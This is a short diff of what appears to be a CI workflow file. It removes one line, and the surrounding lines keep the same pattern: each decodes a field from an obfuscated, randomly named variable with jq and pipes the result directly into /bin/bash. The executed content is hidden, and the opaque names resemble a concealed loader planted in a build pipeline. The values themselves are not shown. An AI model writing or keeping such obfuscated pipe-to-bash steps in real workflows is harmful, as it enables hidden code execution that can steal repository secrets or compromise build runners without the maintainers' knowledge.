@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$fdsn65410" | jq -r .ybqjp998 | /bin/bash
           echo $srl2830 | jq -r .vpl8 | /bin/bash
           echo $ewhru48 | jq -r .oewdr38638 | /bin/bash
-          echo $btj5732 | jq -r .xpqf01173 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
